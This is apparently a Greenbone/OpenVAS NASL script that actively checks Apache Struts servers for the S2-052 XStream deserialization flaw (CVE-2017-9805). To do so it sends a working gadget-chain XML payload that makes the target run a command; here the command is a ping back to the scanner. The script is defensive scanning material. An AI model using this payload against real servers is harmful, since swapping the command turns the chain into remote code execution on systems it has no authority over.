# Copyright (C) 2017 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:apache:struts";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.811730");
  script_version("2021-09-15T09:21:17+0000");
  script_cve_id("CVE-2017-9805");
  script_bugtraq_id(100609);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2021-09-16 10:51:01 +0000 (Thu, 16 Sep 2021)");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-08-12 21:15:00 +0000 (Mon, 12 Aug 2019)");
  script_tag(name:"creation_date", value:"2017-09-07 16:39:09 +0530 (Thu, 07 Sep 2017)");
  script_name("Apache Struts Security Update (S2-052) - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_dependencies("gb_apache_struts_consolidation.nasl", "global_settings.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("apache/struts/http/detected");
  script_exclude_keys("keys/TARGET_IS_IPV6");

  script_xref(name:"URL", value:"https://cwiki.apache.org/confluence/display/WW/S2-052");
  script_xref(name:"Advisory-ID", value:"S2-052");

  script_tag(name:"summary", value:"Apache Struts is prone to a remote code execution
  (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the
  response.");

  script_tag(name:"insight", value:"The flaw exists within the REST plugin which is using
  a XStreamHandler with an instance of XStream for deserialization without any type
  filtering.");

  script_tag(name:"impact", value:"Successfully exploiting this issue may allow an
  attacker to execute arbitrary code in the context of the affected application. Failed
  exploit attempts will likely result in denial-of-service conditions.");

  script_tag(name:"affected", value:"Apache Struts 2.1.2 through 2.3.33 and 2.5 through
  2.5.12.");

  script_tag(name:"solution", value:"Update to version 2.3.34, 2.5.13 or later.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

if(TARGET_IS_IPV6())
  exit(0);

include("http_func.inc");
include("misc_func.inc");
include("host_details.inc");
include("os_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

dir += "/struts2-rest-showcase";

if(os_host_runs("Windows") == "yes") {
  COMMAND = '<string>ping</string><string>-n</string><string>3</string><string>' + this_host() + '</string>';
  win = TRUE;
} else {
  vtstrings = get_vt_strings();
  check = vtstrings["ping_string"];
  pattern = hexstr(check);
  COMMAND = '<string>ping</string><string>-c</string><string>3</string><string>-p</string><string>' + pattern + '</string><string>' + this_host() + '</string>';
}

data =
'       <map>
        <entry>
        <jdk.nashorn.internal.objects.NativeString>
        <flags>0</flags>
        <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
        <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
        <is class="javax.crypto.CipherInputStream">
        <cipher class="javax.crypto.NullCipher">
        <initialized>false</initialized>
        <opmode>0</opmode>
        <serviceIterator class="javax.imageio.spi.FilterIterator">
        <iter class="javax.imageio.spi.FilterIterator">
        <iter class="java.util.Collections$EmptyIterator"/>
        <next class="java.lang.ProcessBuilder">
        <command>
        ' + COMMAND + '
        </command>
        <redirectErrorStream>false</redirectErrorStream>
        </next>
        </iter>
        <filter class="javax.imageio.ImageIO$ContainsFilter">
        <method>
        <class>java.lang.ProcessBuilder</class>
        <name>start</name>
        <parameter-types/>
        </method>
        <name>foo</name>
        </filter>
        <next class="string">foo</next>
        </serviceIterator>
        <lock/>
        </cipher>
        <input class="java.lang.ProcessBuilder$NullInputStream"/>
        <ibuffer/>
        <done>false</done>
        <ostart>0</ostart>
        <ofinish>0</ofinish>
        <closed>false</closed>
        </is>
        <consumed>false</consumed>
        </dataSource>
        <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
        </value>
        </jdk.nashorn.internal.objects.NativeString>
        <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
        </entry>
        <entry>
        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
        </entry>
        </map>';
len = strlen(data);
url = dir + "/orders/3";
req = http_post_put_req(port:port,
                        url:url,
                        data:data,
                        add_headers:make_array("Content-Type", "application/xml"));

# nb: Needs to be after the http_post_put_req() above because that might fork and we need
# to open a socket for every vhost after and not before the fork to avoid race conditions.
soc = open_sock_tcp(port);
if(!soc)
  exit(0);

res = send_capture(socket:soc,
                   data:req,
                   timeout:2,
                   pcap_filter:string("icmp and icmp[0] = 8 and dst host ", this_host(), " and src host ", get_host_ip()));
close(soc);

if(res && (win || check >< res)) {
  report = "It was possible to execute code remotely at " + http_report_vuln_url(port:port, url:url, url_only:TRUE) + " with the command '" + COMMAND + "'.";
  security_message(port:port, data:report);
  exit(0);
}

exit(99);